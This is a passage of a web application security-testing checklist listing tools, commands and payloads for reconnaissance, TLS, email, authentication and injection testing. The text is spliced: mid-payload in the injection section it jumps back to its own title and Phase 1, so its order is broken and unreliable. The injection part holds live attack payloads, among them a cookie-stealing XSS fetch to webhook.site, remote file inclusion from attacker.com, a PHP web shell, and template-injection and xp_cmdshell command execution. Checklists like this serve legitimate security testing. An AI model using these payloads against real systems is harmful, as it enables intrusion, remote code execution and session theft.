  - **Payloads**: `{"$ne": null}`, `{"$gt": ""}`, `'; return true; var x='`

- [ ] **ORM injection** through Object-Relational Mapping frameworks
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Framework-specific tools, Manual testing
  - **How-to**: Test ORM-specific syntax, mass assignment vulnerabilities
  - **Examples**: Hibernate HQL injection, Django ORM injection

- [ ] **Stored procedure** injection testing
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test stored procedure calls with malicious parameters
  - **MSSQL**: `'; EXEC xp_cmdshell('dir'); --`

- [ ] **Database-specific** injection techniques and functions
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), Database-specific payloads
  - **MySQL**: `LOAD_FILE()`, `INTO OUTFILE`, `CONCAT()`
  - **PostgreSQL**: `COPY`, `pg_read_file()`, `pg_ls_dir()`
  - **Oracle**: `UTL_HTTP`, `UTL_FILE`, `DBMS_JAVA`

### 5.2 Cross-Site Scripting (XSS) Testing

- [ ] **Reflected XSS** in all user input parameters
  - **Tools**: [XSStrike](https://github.com/s0md3v/XSStrike), [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/)
  - **How-to**: `python3 xsstrike.py -u "target.com/search?q=FUZZ"`
  - **Payloads**: `<script>alert('XSS')</script>`, `"><script>alert(document.domain)</script>`

- [ ] **Stored XSS** in data persistence points
  - **Tools**: [XSS Hunter](https://xsshunter.com/), [BeEF](https://beefproject.com/), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Submit XSS payloads in forms, comments, profiles
  - **Blind XSS**: `<script src="https://your-server.com/hook.js"></script>`

- [ ] **DOM-based XSS** through client-side JavaScript manipulation
  - **Tools**: [DOMPurify](https://github.com/cure53/DOMPurify), [Burp Suite](https://portswigger.net/burp), Browser DevTools
  - **How-to**: Analyze JavaScript code, test URL fragments, localStorage
  - **Sources**: `window.location`, `document.referrer`, `localStorage`
  - **Sinks**: `innerHTML`, `eval()`, `setTimeout()`

- [ ] **Blind XSS** using external payload hosting services
  - **Tools**: [XSS Hunter](https://xsshunter.com/), [Webhook.site](https://webhook.site/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
  - **How-to**: Submit payloads that call back to external server
  - **Payload**: `<script>fetch('https://webhook.site/YOUR-UUID?cookie='+document.cookie)</script>`

- [ ] **XSS in file upload** through malicious file names or content
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Upload Scanner](https://github.com/modzero/mod0BurpUploadScanner)
  - **How-to**: Upload files with XSS in filename, SVG with embedded scripts
  - **SVG payload**: `<svg onload="alert('XSS')">`, HTML files with script tags

- [ ] **Content Security Policy (CSP)** bypass techniques
  - **Tools**: [CSP Auditor](https://csp-auditor.org/), [CSP Bypass](https://github.com/PortSwigger/csp-bypass), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Analyze CSP header, find unsafe directives, JSONP endpoints
  - **Bypass**: `unsafe-inline`, `unsafe-eval`, JSONP callbacks, base-uri

- [ ] **Filter evasion** using encoding and obfuscation techniques
  - **Tools**: [XSS Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot), [HTML5 Security Cheatsheet](https://html5sec.org/)
  - **Encoding**: URL encoding, HTML entities, Unicode, Base64
  - **Obfuscation**: `eval(atob('YWxlcnQoJ1hTUycpOw=='))`, String.fromCharCode()

### 5.3 Command Injection Testing

- [ ] **OS command injection** through system calls
  - **Tools**: [Commix](https://github.com/commixproject/commix), [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: `python commix.py --url="target.com/ping.php" --data="ip=127.0.0.1"`
  - **Payloads**: `; whoami`, `| cat /etc/passwd`, `&& dir`, `` `id` ``

- [ ] **Code injection** in interpreted languages (PHP, Python, etc.)
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Language-specific payloads
  - **PHP**: `<?php system($_GET['cmd']); ?>`, `eval($_POST['code']);`
  - **Python**: `exec()`, `eval()`, `__import__('os').system()`
  - **Node.js**: `require('child_process').exec()`

- [ ] **LDAP injection** in directory service interactions
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [LDAP Injection Scanner](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
  - **How-to**: Test LDAP search filters, authentication bypass
  - **Payloads**: `*)(uid=*))(|(uid=*`, `*)(|(password=*)`, `admin)(&(password=*))`

- [ ] **XPath injection** in XML data processing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [XPath Injection Scanner](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPath%20Injection)
  - **How-to**: Test XPath queries with malicious input
  - **Payloads**: `' or '1'='1`, `'] | //user/* | a['`, `') or ('1'='1`

- [ ] **Template injection** in server-side template engines
  - **Tools**: [tplmap](https://github.com/epinna/tplmap), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: `python2.7 tplmap.py -u 'target.com/page?name=*'`
  - **Jinja2**: `{{7*7}}`, `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
  - **Twig**: `{{7*7}}`, `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

- [ ] **Expression language injection** in framework-specific contexts
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Framework-specific payloads
  - **Spring EL**: `${7*7}`, `#{T(java.lang.Runtime).getRuntime().exec('id')}`
  - **JSF EL**: `#{facesContext.externalContext.redirect("http://evil.com")}`

- [ ] **Deserialization** vulnerabilities in object serialization
  - **Tools**: [ysoserial](https://github.com/frohoff/ysoserial), [phpggc](https://github.com/ambionics/phpggc), [Burp Suite](https://portswigger.net/burp)
  - **Java**: `java -jar ysoserial.jar CommonsCollections1 'id' | base64`
  - **PHP**: `php -d phar.readonly=0 phpggc/phpggc -p phar -o /tmp/exploit.phar monolog/rce1 system id`
  - **Python**: Pickle exploitation, `__reduce__` method abuse

### 5.4 File-Related Injection Testing

- [ ] **Local File Inclusion (LFI)** through path manipulation
  - **Tools**: [LFISuite](https://github.com/D35m0nd142/LFISuite), [Burp Suite](https://portswigger.net/burp), [DotDotPwn](https://github.com/wireghoul/dotdotpwn)
  - **How-to**: `python lfisuite.py -u target.com/page.php?file=`
  - **Payloads**: `../../../etc/passwd`, `....//....//....//etc/passwd`, `php://filter/read=convert.base64-encode/resource=index.php`

- [ ] **Remote File Inclusion (RFI)** through URL manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing, Remote payload hosting
  - **How-to**: Host malicious file on attacker server, include via vulnerable parameter
  - **Payloads**: `http://attacker.com/shell.txt`, `ftp://attacker.com/shell.php`

- [ ] **Path traversal** attacks using directory traversal sequences
  - **Tools**: [DotDotPwn](https://github.com/wireghoul/dotdotpwn), [Burp Suite](https://portswigger.net/burp), [Path Traversal Scanner](https://github.com/wireghoul/dotdotpwn)
  - **How-to**: `./dotdotpwn.pl -m http -h target.com -x 8080 -f /etc/passwd`
  - **Payloads**: `../`, `..\\`, `....//`, URL-encoded variants

- [ ] **File upload** vulnerabilities and malicious file execution
  - **Tools**: [Upload Scanner](https://github.com/modzero/mod0BurpUploadScanner), [Fuxploider](https://github.com/almandin/fuxploider), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test file type restrictions, executable upload, path manipulation
  - **Bypass**: Double extensions (.php.jpg), MIME type spoofing, null bytes

- [ ] **XXE (XML External Entity)** injection in XML processing
  - **Tools**: [XXEinjector](https://github.com/enjoiz/XXEinjector), [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/)
  - **How-to**: `python3 XXEinjector.py --host=127.0.0.1 --httpport=8000 --file=/etc/passwd --path=/xxe --oob=http`
  - **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`

- [ ] **Server-Side Request Forgery (SSRF)** through URL parameters
  - **Tools**: [SSRFmap](https://github.com/swisskyrepo/SSRFmap), [Burp Suite](https://portswigger.net/burp), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
  - **How-to**: `python3 ssrfmap.py -r data/request.txt -p url -m readfiles`
  - **Payloads**: `http://localhost:22`, `file:///etc/passwd`, `gopher://127.0.0.1:3306`

- [ ] **Log injection** through user-controlled input in logs
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Inject malicious content into User-Agent, Referer headers
  - **Payloads**: CRLF injection, log poisoning for LFI, XSS in log viewers

## Phase 6: Business Logic & Application Flow Testing

### 6.1 Transaction Logic Testing

- [ ] **Price manipulation** in e-commerce transactions
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/), Manual testing
  - **How-to**: Intercept and modify price parameters in purchase flow
  - **Testing**: Negative prices, currency manipulation, bulk discount abuse

- [ ] **Quantity manipulation** to cause integer overflow or negative values
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Calculator for overflow values
  - **How-to**: Test large numbers (2147483647), negative quantities
  - **Scenarios**: Shopping cart, bulk orders, subscription quantities

- [ ] **Discount code** reuse and validation bypass
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test multiple uses, case sensitivity, parameter pollution
  - **Bypass**: Multiple coupon stacking, expired code reuse, user transfer

- [ ] **Payment process** manipulation and race conditions
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
  - **How-to**: Test concurrent payment processing, state manipulation
  - **Testing**: Double spending, payment bypass, partial payment acceptance

- [ ] **Refund process** abuse and duplicate refund attempts
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test refund validation, multiple refund requests
  - **Abuse**: Refund without return, duplicate refunds, partial refunds

- [ ] **Currency manipulation** in multi-currency applications
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test currency conversion, rate manipulation
  - **Testing**: Currency arbitrage, conversion bypass, rate confusion

- [ ] **Tax calculation** bypass and manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test tax calculation logic, jurisdiction manipulation
  - **Bypass**: Address manipulation, tax exemption abuse, calculation errors

### 6.2 Workflow Logic Testing

- [ ] **Multi-step process** manipulation and step skipping
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Access later steps without completing earlier ones
  - **Testing**: Registration flow, checkout process, approval workflows

- [ ] **State transition** validation and enforcement
  - **Tools**: [Burp Suite](https://portswigger.net/burp), State diagram analysis
  - **How-to**: Test invalid state transitions, forced state changes
  - **Examples**: Order status manipulation, account state bypass

- [ ] **Time-based restrictions** bypass (limited-time offers, etc.)
  - **Tools**: [Burp Suite](https://portswigger.net/burp), System clock manipulation
  - **How-to**: Test time validation, clock skew exploitation
  - **Bypass**: Local time manipulation, server time confusion

- [ ] **Sequential numbering** predictability and manipulation
  - **Tools**: [Burp Suite Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Analyze order IDs, invoice numbers, ticket numbers
  - **Testing**: Predictable sequences, information disclosure

- [ ] **Approval workflow** bypass and manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test approval bypasses, self-approval, role confusion
  - **Scenarios**: Document approval, transaction authorization, user registration

- [ ] **Notification system** abuse and information leakage
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Email analysis
  - **How-to**: Test notification triggers, information disclosure
  - **Abuse**: Spam notifications, information harvesting, social engineering

- [ ] **Audit trail** integrity and completeness
  - **Tools**: Log analysis tools, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test log completeness, tampering detection
  - **Testing**: Missing critical actions, log injection, timestamp manipulation

### 6.3 Data Validation Logic

- [ ] **Input length** validation and buffer overflow testing
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp), Long string generators
  - **How-to**: Test maximum length limits, buffer boundaries
  - **Payloads**: Very long strings, boundary values, UTF-8 expansion

- [ ] **Data type** validation and type confusion attacks
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Send unexpected data types (string for integer, array for string)
  - **Testing**: JSON type confusion, parameter pollution

- [ ] **Format validation** bypass (email, phone, etc.)
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Regex testing tools
  - **How-to**: Test format validation with edge cases
  - **Bypass**: Unicode characters, unusual but valid formats

- [ ] **Character encoding** attacks and validation bypass
  - **Tools**: [Burp Suite](https://portswiger.net/burp), Unicode testing tools
  - **How-to**: Test UTF-8, UTF-16, various encodings
  - **Payloads**: Overlong UTF-8, null bytes, control characters

- [ ] **Regular expression** DoS (ReDoS) through malicious input
  - **Tools**: [ReDoS-Scanner](https://github.com/yassineaboukir/ReDoS-Scanner), Manual testing
  - **How-to**: Test regex patterns with catastrophic backtracking
  - **Payloads**: `(a+)+# Comprehensive Web Application Security Testing Checklist

## Phase 1: Reconnaissance & Information Gathering

### 1.1 Target Discovery & Enumeration

- [ ] **Subdomain enumeration** using tools like Subfinder, Amass, or Assetfinder
  - **Tools**: [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder)
  - **How-to**: `subfinder -d target.com -all | tee subdomains.txt`
  - **Alternative**: [Sublist3r](https://github.com/aboul3la/Sublist3r): `python sublist3r.py -d target.com`

- [ ] **DNS enumeration** to identify all DNS records (A, AAAA, CNAME, MX, TXT, NS)
  - **Tools**: [DNSRecon](https://github.com/darkoperator/dnsrecon), [Fierce](https://github.com/mschwager/fierce), [DNSEnum](https://github.com/fwaeytens/dnsenum)
  - **How-to**: `dnsrecon -d target.com -a` or `fierce --domain target.com`
  - **Online**: [DNSDumpster](https://dnsdumpster.com/), [SecurityTrails](https://securitytrails.com/)

- [ ] **Port scanning** with Nmap to identify open services beyond HTTP/HTTPS
  - **Tools**: [Nmap](https://nmap.org/), [Masscan](https://github.com/robertdavidgraham/masscan), [RustScan](https://github.com/RustScan/RustScan)
  - **How-to**: `nmap -sS -sV -O -A target.com` or `rustscan -a target.com -- -sV`
  - **Fast scan**: `masscan -p1-65535 target.com --rate=1000`

- [ ] **Service fingerprinting** to identify web server, technologies, and versions
  - **Tools**: [Wappalyzer](https://www.wappalyzer.com/), [WhatWeb](https://github.com/urbanadventurer/WhatWeb), [HTTPrint](https://github.com/urbanadventurer/WhatWeb)
  - **How-to**: `whatweb target.com` or browser extension Wappalyzer
  - **Alternative**: `curl -I target.com` (manual header analysis)

- [ ] **Certificate transparency** logs analysis using crt.sh or Censys
  - **Tools**: [crt.sh](https://crt.sh/), [Censys](https://censys.io/), [Certificate Transparency Monitor](https://developers.facebook.com/tools/ct/)
  - **How-to**: Visit `https://crt.sh/?q=target.com` or use API: `curl -s "https://crt.sh/?q=target.com&output=json"`
  - **Tool**: [Certspotter](https://github.com/SSLMate/certspotter): `certspotter -domain target.com`

- [ ] **Search engine reconnaissance** using Google dorking and specialized search engines
  - **Tools**: [Google](https://www.google.com/), [Shodan](https://www.shodan.io/), [Bing](https://www.bing.com/)
  - **How-to**: `site:target.com filetype:pdf`, `inurl:admin site:target.com`
  - **Advanced**: [GHDB](https://www.exploit-db.com/google-hacking-database), [DorkSearch](https://dorksearch.com/)

### 1.2 Web Application Fingerprinting

- [ ] **Technology stack identification** using Wappalyzer, BuiltWith, or manual analysis
  - **Tools**: [Wappalyzer](https://www.wappalyzer.com/), [BuiltWith](https://builtwith.com/), [Retire.js](https://retirejs.github.io/retire.js/)
  - **How-to**: Browser extension or `retire --js --outputformat json --outputpath .`
  - **CLI**: [webtech](https://github.com/ShielderSec/webtech): `webtech -u target.com`

- [ ] **Web server identification** and version detection
  - **Tools**: [Httprint](https://github.com/urbanadventurer/WhatWeb), [Nmap](https://nmap.org/), [WafW00f](https://github.com/EnableSecurity/wafw00f)
  - **How-to**: `nmap --script http-server-header target.com` or `curl -I target.com`
  - **Advanced**: `nmap --script http-methods target.com`

- [ ] **Framework detection** (React, Angular, Laravel, Django, etc.)
  - **Tools**: Browser DevTools, [Wappalyzer](https://www.wappalyzer.com/), Source code analysis
  - **How-to**: Check JavaScript files, meta tags, and HTTP headers
  - **Manual**: View page source for framework-specific comments or file structures

- [ ] **Content Management System** identification (WordPress, Joomla, Drupal)
  - **Tools**: [CMSmap](https://github.com/Dionach/CMSmap), [WPScan](https://github.com/wpscanteam/wpscan), [Joomscan](https://github.com/OWASP/joomscan)
  - **How-to**: `wpscan --url target.com` or `python3 cmsmap.py -t target.com`
  - **Drupal**: [Droopescan](https://github.com/droope/droopescan): `droopescan scan drupal -u target.com`

- [ ] **Third-party integrations** and plugins identification
  - **Tools**: Browser DevTools Network tab, [WPScan](https://github.com/wpscanteam/wpscan) for WordPress
  - **How-to**: Monitor network requests, analyze loaded scripts and stylesheets
  - **WordPress**: `wpscan --url target.com --enumerate p` (enumerate plugins)

- [ ] **JavaScript libraries** and dependencies analysis
  - **Tools**: [Retire.js](https://retirejs.github.io/retire.js/), [Snyk](https://snyk.io/), Browser DevTools
  - **How-to**: `retire --js --outputformat json`, check `/js/` directories
  - **Alternative**: [JSNice](http://www.jsnice.org/) for deobfuscation

### 1.3 Content Discovery

- [ ] **Directory and file enumeration** using tools like Gobuster, Dirbuster, or Feroxbuster
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster), [Feroxbuster](https://github.com/epi052/feroxbuster), [Dirsearch](https://github.com/maurosoria/dirsearch)
  - **How-to**: `gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
  - **Alternative**: `feroxbuster -u target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt`

- [ ] **Hidden parameters discovery** using Arjun, ParamSpider, or Parameth
  - **Tools**: [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [Parameth](https://github.com/maK-/parameth)
  - **How-to**: `python3 arjun.py -u target.com` or `python3 paramspider.py -d target.com`
  - **Manual**: Use Burp Suite Intruder with parameter wordlists

- [ ] **Backup file detection** using tools like BFAC or custom wordlists
  - **Tools**: [BFAC](https://github.com/mazen160/bfac), [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
  - **How-to**: `python bfac --url target.com --level 4`
  - **Manual**: Test for `.bak`, `.backup`, `.old`, `.orig`, `~` files

- [ ] **Administrative interfaces** location (admin panels, debug interfaces)
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster) with admin wordlists, Manual enumeration
  - **How-to**: `gobuster dir -u target.com -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt`
  - **Common paths**: `/admin`, `/administrator`, `/wp-admin`, `/phpmyadmin`

- [ ] **API endpoints discovery** through documentation, JavaScript files, or fuzzing
  - **Tools**: [Kiterunner](https://github.com/assetnote/kiterunner), [FFuF](https://github.com/ffuf/ffuf), [Gobuster](https://github.com/OJ/gobuster)
  - **How-to**: `kr scan target.com -w routes-large.kite` or analyze JS files for endpoints
  - **Manual**: Check `/api/v1/`, `/rest/`, `/graphql` paths

- [ ] **Development artifacts** search (.git, .svn, .env files, source maps)
  - **Tools**: [GitTools](https://github.com/internetwache/GitTools), [dvcs-ripper](https://github.com/kost/dvcs-ripper)
  - **How-to**: `python3 gitdumper.py target.com/.git/ output/` or check for `.env`, `web.config`
  - **Source maps**: Check for `.map` files in browser DevTools Sources tab

### 1.4 Information Leakage Assessment

- [ ] **robots.txt, sitemap.xml** analysis for disclosed paths
  - **Tools**: Browser, [curl](https://curl.se/), [wget](https://www.gnu.org/software/wget/)
  - **How-to**: `curl target.com/robots.txt` and `curl target.com/sitemap.xml`
  - **Automated**: Include in directory enumeration wordlists

- [ ] **crossdomain.xml, clientaccesspolicy.xml** review for CORS misconfigurations
  - **Tools**: Browser, curl, [CORStest](https://github.com/RUB-NDS/CORStest)
  - **How-to**: `curl target.com/crossdomain.xml` and analyze allowed domains
  - **Testing**: Check for wildcard (*) domains or overly permissive policies

- [ ] **Source code comments** analysis for sensitive information
  - **Tools**: Browser DevTools, [Grep](https://www.gnu.org/software/grep/), [JSParser](https://github.com/nahamsec/JSParser)
  - **How-to**: View page source, search for `<!--`, `//`, `/*` comments
  - **Automated**: `curl -s target.com | grep -i "password\|api\|key\|token"`

- [ ] **Error messages** analysis for information disclosure
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Send malformed requests, invalid parameters, SQL syntax
  - **Test cases**: `'`, `"`, `<script>`, `../../../etc/passwd`

- [ ] **HTTP headers** analysis for version disclosure and security headers
  - **Tools**: curl, [securityheaders.com](https://securityheaders.com/), [Mozilla Observatory](https://observatory.mozilla.org/)
  - **How-to**: `curl -I target.com` or online header analyzers
  - **Check for**: Server versions, X-Powered-By, security headers

- [ ] **Cookie analysis** for secure flags and sensitive data exposure
  - **Tools**: Browser DevTools, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Check Application tab in DevTools, analyze cookie attributes
  - **Look for**: Missing Secure, HttpOnly, SameSite flags; sensitive data in values

### 1.5 External Intelligence Gathering

- [ ] **Shodan** search for exposed services and vulnerabilities
  - **Tools**: [Shodan](https://www.shodan.io/), [Shodan CLI](https://github.com/achillean/shodan-python)
  - **How-to**: `shodan search "target.com"` or web interface search
  - **Queries**: `ssl:"target.com"`, `org:"Organization Name"`

- [ ] **Wayback Machine** analysis using tools like Gau or Waybackurls
  - **Tools**: [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Internet Archive](https://archive.org/)
  - **How-to**: `echo target.com | gau` or `echo target.com | waybackurls`
  - **Analysis**: Look for old admin panels, deprecated endpoints, leaked files

- [ ] **Leaked credentials** search using tools like PwnDB or Have I Been Pwned API
  - **Tools**: [PwnDB](http://pwndb2am4tzkvold.onion/) (Tor), [HIBP API](https://haveibeenpwned.com/API/v3), [Dehashed](https://dehashed.com/)
  - **How-to**: Search for organization email domains in breach databases
  - **Legal**: Only search for your own organization's data

- [ ] **Social media** and public repositories reconnaissance
  - **Tools**: [Maltego](https://www.maltego.com/), [theHarvester](https://github.com/laramies/theHarvester), [Sherlock](https://github.com/sherlock-project/sherlock)
  - **How-to**: `python3 theHarvester.py -d target.com -l 100 -b all`
  - **GitHub**: Search for organization name, API keys, credentials

- [ ] **WHOIS** information gathering for domain and organization details
  - **Tools**: [whois](https://linux.die.net/man/1/whois), [DomainTools](https://whois.domaintools.com/), [WhoisXML API](https://www.whoisxmlapi.com/)
  - **How-to**: `whois target.com` or use online WHOIS lookup tools
  - **Analysis**: Contact information, name servers, registration dates

- [ ] **Email harvesting** from public sources and breach databases
  - **Tools**: [theHarvester](https://github.com/laramies/theHarvester), [Hunter.io](https://hunter.io/), [Phonebook.cz](https://phonebook.cz/)
  - **How-to**: `python3 theHarvester.py -d target.com -b hunter`
  - **Sources**: LinkedIn, company websites, job postings

## Phase 2: Network & Infrastructure Security

### 2.1 Network Protocol Testing

- [ ] **ICMP filtering** assessment for network reconnaissance prevention
  - **Tools**: [ping](https://linux.die.net/man/8/ping), [Nmap](https://nmap.org/), [hping3](https://github.com/antirez/hping)
  - **How-to**: `ping target.com` and `nmap -PE target.com`
  - **Advanced**: `hping3 -1 target.com` (ICMP ping)

- [ ] **UDP services enumeration** using tools like UDP-proto-scanner
  - **Tools**: [UDP-proto-scanner](https://github.com/portcullislabs/udp-proto-scanner), [Nmap](https://nmap.org/), [Unicornscan](https://sourceforge.net/projects/unicornscan/)
  - **How-to**: `nmap -sU --top-ports 100 target.com` or `python udp-proto-scanner.py target.com`
  - **Common ports**: 53 (DNS), 161 (SNMP), 123 (NTP)

- [ ] **IPv6 configuration** testing if dual-stack is implemented
  - **Tools**: [Nmap](https://nmap.org/), [ping6](https://linux.die.net/man/8/ping), [THC-IPv6](https://github.com/vanhauser-thc/thc-ipv6)
  - **How-to**: `nmap -6 target.com` or `ping6 target.com`
  - **Discovery**: `nmap -6 --script ipv6-multicast-mld-list target.com`

- [ ] **Network segmentation** testing between different application tiers
  - **Tools**: [Nmap](https://nmap.org/), [Traceroute](https://linux.die.net/man/8/traceroute), Network analysis
  - **How-to**: Map network topology, test access between segments
  - **Testing**: Attempt to reach internal services from DMZ

- [ ] **Firewall rule** effectiveness assessment
  - **Tools**: [Nmap](https://nmap.org/), [Firewalk](http://packetfactory.openwall.net/projects/firewalk/), [FTester](http://www.inversepath.com/ftester.html)
  - **How-to**: `nmap -sA target.com` (ACK scan to detect firewall rules)
  - **Bypass**: Test different protocols, fragmentation, timing

### 2.2 SSL/TLS Security Assessment

- [ ] **SSL/TLS configuration** testing using SSLyze, testssl.sh, or SSL Labs
  - **Tools**: [testssl.sh](https://testssl.sh/), [SSLyze](https://github.com/nabla-c0d3/sslyze), [SSL Labs](https://www.ssllabs.com/ssltest/)
  - **How-to**: `./testssl.sh target.com` or online SSL Labs scan
  - **Comprehensive**: `sslyze --regular target.com`

- [ ] **Certificate validation** including chain of trust and revocation status
  - **Tools**: [OpenSSL](https://www.openssl.org/), [testssl.sh](https://testssl.sh/), Browser certificate viewer
  - **How-to**: `openssl s_client -connect target.com:443 -showcerts`
  - **Validation**: Check expiry, subject alternative names, CA trust

- [ ] **Weak cipher suites** and protocol versions identification
  - **Tools**: [testssl.sh](https://testssl.sh/), [Nmap](https://nmap.org/) SSL scripts, [SSLScan](https://github.com/rbsec/sslscan)
  - **How-to**: `nmap --script ssl-enum-ciphers target.com` or `sslscan target.com`
  - **Check for**: SSLv2, SSLv3, TLS 1.0, weak ciphers (RC4, DES)

- [ ] **Perfect Forward Secrecy** implementation verification
  - **Tools**: [testssl.sh](https://testssl.sh/), [SSL Labs](https://www.ssllabs.com/ssltest/)
  - **How-to**: Check for ECDHE/DHE cipher suites in SSL/TLS configuration
  - **Validation**: Ensure ephemeral key exchange is supported

- [ ] **HSTS implementation** and configuration assessment
  - **Tools**: curl, Browser DevTools, [testssl.sh](https://testssl.sh/)
  - **How-to**: `curl -I target.com | grep -i strict-transport-security`
  - **Check**: max-age value, includeSubDomains, preload directives

- [ ] **Certificate transparency** compliance verification
  - **Tools**: [crt.sh](https://crt.sh/), [Certificate Transparency Monitor](https://developers.facebook.com/tools/ct/), Browser CT extensions
  - **How-to**: Search certificate logs for domain certificates
  - **Validation**: Ensure certificates are logged in CT logs

### 2.3 Email Security Configuration

- [ ] **SPF record** configuration and effectiveness testing
  - **Tools**: [MXToolbox](https://mxtoolbox.com/spf.aspx), [SPF Surveyor](https://www.kitterman.com/spf/validate.html), [dig](https://linux.die.net/man/1/dig)
  - **How-to**: `dig TXT target.com | grep spf` or online SPF checkers
  - **Testing**: Send test emails to verify SPF validation

- [ ] **DKIM signature** validation and key management assessment
  - **Tools**: [MXToolbox DKIM Lookup](https://mxtoolbox.com/dkim.aspx), [DKIM Validator](https://dkimvalidator.com/)
  - **How-to**: `dig TXT selector._domainkey.target.com` (replace selector)
  - **Testing**: Send emails and verify DKIM signatures

- [ ] **DMARC policy** implementation and reporting configuration
  - **Tools**: [MXToolbox DMARC](https://mxtoolbox.com/dmarc.aspx), [DMARC Analyzer](https://www.dmarcanalyzer.com/), [dmarcian](https://dmarcian.com/)
  - **How-to**: `dig TXT _dmarc.target.com` or online DMARC checkers
  - **Check**: Policy (none/quarantine/reject), reporting URIs

- [ ] **Email spoofing** resistance testing using tools like spoofcheck
  - **Tools**: [spoofcheck](https://github.com/BishopFox/spoofcheck), [checkdmarc](https://github.com/domainaware/checkdmarc)
  - **How-to**: `python spoofcheck.py target.com` or manual email testing
  - **Testing**: Send spoofed emails to test protection effectiveness

- [ ] **Mail server security** headers and configuration review
  - **Tools**: [Nmap](https://nmap.org/) SMTP scripts, [telnet](https://linux.die.net/man/1/telnet), [swaks](https://github.com/jetmore/swaks)
  - **How-to**: `nmap --script smtp-* target.com` or `telnet target.com 25`
  - **Check**: SMTP banner, supported commands, relay testing

## Phase 3: Authentication & Session Management

### 3.1 User Registration Security

- [ ] **Duplicate registration** prevention mechanisms testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/), Manual testing
  - **How-to**: Attempt to register with existing username/email
  - **Testing**: Try variations (case sensitivity, special characters)

- [ ] **Username enumeration** through registration process
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), [FFuF](https://github.com/ffuf/ffuf)
  - **How-to**: Monitor response differences for existing vs non-existing users
  - **Indicators**: Response time, message differences, HTTP status codes

- [ ] **Email verification** process security and bypass attempts
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Email clients, [temp-mail](https://temp-mail.org/)
  - **How-to**: Test verification link manipulation, token reuse, expiration
  - **Bypass**: Try accessing account before verification, token prediction

- [ ] **Password policy** strength and enforcement testing
  - **Tools**: Manual testing, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test minimum length, complexity requirements, common passwords
  - **Weak patterns**: Test "password123", "123456", dictionary words

- [ ] **Account activation** link security and expiration testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test link reuse, expiration, token manipulation
  - **Security**: Check for predictable tokens, race conditions

- [ ] **Disposable email** address filtering effectiveness
  - **Tools**: [10minutemail](https://10minutemail.com/), [Guerrilla Mail](https://www.guerrillamail.com/), [temp-mail](https://temp-mail.org/)
  - **How-to**: Attempt registration with disposable email services
  - **Bypass**: Try lesser-known disposable email providers

- [ ] **Rate limiting** on registration attempts
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), [FFuF](https://github.com/ffuf/ffuf), Custom scripts
